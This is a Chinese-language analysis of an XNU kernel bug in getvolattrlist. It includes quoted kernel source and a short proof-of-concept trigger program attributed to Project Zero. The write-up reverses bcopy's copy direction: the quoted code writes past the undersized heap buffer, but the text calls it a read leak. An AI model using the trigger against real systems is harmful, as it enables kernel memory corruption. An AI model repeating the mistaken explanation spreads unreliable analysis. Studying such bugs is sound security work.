# 漏洞分析

漏洞位置在getvolattrlist函数中，函数声明如下

	static int
	getvolattrlist(
		vfs_context_t ctx, 
		vnode_t vp, 
		struct attrlist *alp,
		user_addr_t attributeBuffer, 
		size_t bufferSize,
		uint64_t options,
		enum uio_seg segflg, 
		int is_64bit
	);

具体位置

		/*
	   * Allocate a target buffer for attribute results.
	   * Note that since we won't ever copy out more than the caller requested,
	   * we never need to allocate more than they offer.
	   */
	  ab.allocated = ulmin(bufferSize, fixedsize + varsize);
	  if (ab.allocated > ATTR_MAX_BUFFER) {
	    error = ENOMEM;
	    VFS_DEBUG(ctx, vp, "ATTRLIST - ERROR: buffer size too large (%d limit %d)", ab.allocated, ATTR_MAX_BUFFER);
	    goto out;
	  }
	  MALLOC(ab.base, char *, ab.allocated, M_TEMP, M_ZERO | M_WAITOK);

ulmin函数返回两者中较小的size

	static inline u_int32_t
	ulmin(u_int32_t a, u_int32_t b)
	{
		return (a < b ? a : b);
	}

当用户提供的size小于ATTR_MAX_BUFFER时

	MALLOC(ab.base, char *, ab.allocated, M_TEMP, M_ZERO | M_WAITOK);

会在ab.base地址处申请一块大小为 ab.allocated堆

在后面我们会执行以下代码

		/* Return attribute set output if requested. */
		if (return_valid) {
			ab.actual.commonattr |= ATTR_CMN_RETURNED_ATTRS;
			if (pack_invalid) {
				/* Only report the attributes that are valid */
				ab.actual.commonattr &= ab.valid.commonattr;
				ab.actual.volattr &= ab.valid.volattr;
			}
			bcopy(&ab.actual, ab.base + sizeof(uint32_t), sizeof (ab.actual));
		}

bcopy函数内部调用了memcpy函数，往&ab.actual复制ab.base + sizeof(uint32_t)开始的sizeof (ab.actual)个字节数据

	void
	bcopy(const void *s1, void *s2, size_t n)
	{
		memcpy(s2, s1, n);
	}

这里的问题是如果ab.base处分配的堆大小小于sizeof (ab.actual)，那么就会把ab.base处分配的堆内存之后的数据复制给ab.actual处，造成堆泄露

# struct _attrlist_buf

这里有一个结构体

	struct _attrlist_buf ab;

具体结构如下

	/*
	 * Structure describing the state of an in-progress attrlist operation.
	 */
	struct _attrlist_buf {
		char	*base;
		char	*fixedcursor;
		char	*varcursor;
		ssize_t	allocated;
		ssize_t needed;
		attribute_set_t	actual;
		attribute_set_t valid;
	};

我们重点关注base,actual

base是一个char *类型

actual是一个attribute_set_t结构体，该结构体具体结构如下

	typedef struct attribute_set {
		attrgroup_t commonattr;			/* common attribute group */
		attrgroup_t volattr;			/* Volume attribute group */
		attrgroup_t dirattr;			/* directory attribute group */
		attrgroup_t fileattr;			/* file attribute group */
		attrgroup_t forkattr;			/* fork attribute group */
	} attribute_set_t;

其中attrgroup_t是一个无符号int32类型

	typedef u_int32_t attrgroup_t;

# Poc

以下是google project-zero ianbeer提供的poc

	#include <stdio.h>
	#include <stdlib.h>
	#include <fcntl.h>
	#include <unistd.h>
	#include <sys/attr.h>
	
	int main() {
		  int fd = open("/", O_RDONLY);
		  if (fd == -1) {
		    perror("unable to open fs root\n");
		    return 0;
		  }
		
		  struct attrlist al = {0};
		
		  al.bitmapcount = ATTR_BIT_MAP_COUNT;
		  al.volattr = 0xfff;
		  al.commonattr = ATTR_CMN_RETURNED_ATTRS;
		
		  size_t attrBufSize = 16;
		  void* attrBuf = malloc(attrBufSize);
		  int options = 0;
		
		  int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
		  printf("err: %d\n", err);
		  return 0;
	}

调用顺序
	
	fgetattrlist() -> getattrlist_internal() -> getvolattrlist()

